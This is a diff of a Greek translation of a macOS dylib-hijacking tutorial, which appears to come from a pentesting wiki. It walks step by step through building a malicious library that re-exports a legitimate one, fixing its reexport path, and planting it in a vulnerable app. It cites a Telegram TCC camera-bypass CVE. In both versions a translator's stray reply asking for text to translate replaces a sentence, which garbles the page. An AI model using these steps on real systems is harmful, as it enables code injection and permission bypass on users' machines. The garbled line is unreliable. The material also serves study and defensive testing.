@@ -77,12 +77,12 @@ compatibility version 1.0.0
 {{#endtab}}
 {{#endtabs}}
 
-Με τις προηγούμενες πληροφορίες γνωρίζουμε ότι **δεν ελέγχει την υπογραφή των φορτωμένων libraries** και **προσπαθεί να φορτώσει ένα library από**:
+Με τις προηγούμενες πληροφορίες γνωρίζουμε ότι **δεν ελέγχει την υπογραφή των φορτωμένων libraries** και **προσπαθεί να φορτώσει μια library από**:
 
 - `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 - `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
 
-Ωστόσο, το πρώτο δεν υπάρχει:
+Ωστόσο, η πρώτη δεν υπάρχει:
 ```bash
 pwd
 /Applications/VulnDyld.app
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Επομένως, είναι δυνατή η hijack του! Δημιούργησε μια library που **εκτελεί κάποιο arbitrary code και εξάγει τις ίδιες λειτουργίες** με τη legit library, κάνοντας reexport τη. Και θυμήσου να την κάνεις compile με τις αναμενόμενες versions:
+Επομένως, είναι δυνατό να πραγματοποιηθεί hijack! Δημιούργησε μια library που **εκτελεί κάποιο arbitrary code και εξάγει τις ίδιες λειτουργίες** με τη legit library, κάνοντας reexport της. Και θυμήσου να την κάνεις compile με τις αναμενόμενες versions:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -99,12 +99,12 @@ void custom(int argc, const char **argv) {
 NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
-Παρακαλώ παρέχετε το περιεχόμενο που θέλετε να μεταφράσω.
+Παρακαλώ επικολλήστε το αγγλικό κείμενο που θέλετε να μεταφράσω.
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
-Η διαδρομή reexport που δημιουργήθηκε στη library είναι σχετική με τον loader. Ας την αλλάξουμε σε absolute path προς τη library που θα γίνει export:
+Η διαδρομή reexport που δημιουργήθηκε στη library είναι σχετική με τον loader· ας την αλλάξουμε σε απόλυτη διαδρομή προς τη library που θα γίνει export:
 ```bash
 #Check relative
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
@@ -121,11 +121,11 @@ cmd LC_REEXPORT_DYLIB
 cmdsize 128
 name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
-Τέλος, απλώς αντιγράψτε το στη **hijacked location**:
+Τέλος, απλώς αντιγράψτε το στη **τοποθεσία που έχει γίνει hijack**:
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
-Και **εκτέλεσε** το binary και έλεγξε ότι **φορτώθηκε η βιβλιοθήκη**:
+Και **εκτελέστε** το binary και ελέγξτε ότι η **library φορτώθηκε**:
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
 <strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
@@ -133,11 +133,11 @@ cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 </code></pre>
 
 > [!TIP]
-> Ένα καλό writeup σχετικά με το πώς μπορεί να γίνει abuse αυτής της ευπάθειας για την παράκαμψη των δικαιωμάτων κάμερας του telegram θα βρείτε στο [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>
+> Ένα ωραίο writeup σχετικά με το πώς μπορεί να γίνει abuse αυτής της ευπάθειας για την παράκαμψη των δικαιωμάτων camera του telegram μπορείτε να βρείτε στο [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>
 
 ## Μεγαλύτερη κλίμακα
 
-Αν σκοπεύετε να δοκιμάσετε να κάνετε inject libraries σε απρόσμενα binaries, μπορείτε να ελέγξετε τα event messages για να διαπιστώσετε πότε φορτώνεται η βιβλιοθήκη μέσα σε ένα process (σε αυτή την περίπτωση αφαιρέστε το printf και την εκτέλεση του `/bin/bash`).
+Αν σκοπεύετε να δοκιμάσετε να κάνετε inject libraries σε απρόβλεπτα binaries, μπορείτε να ελέγξετε τα event messages για να διαπιστώσετε πότε φορτώνεται η library μέσα σε μια process (σε αυτή την περίπτωση αφαιρέστε το printf και την εκτέλεση του `/bin/bash`).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
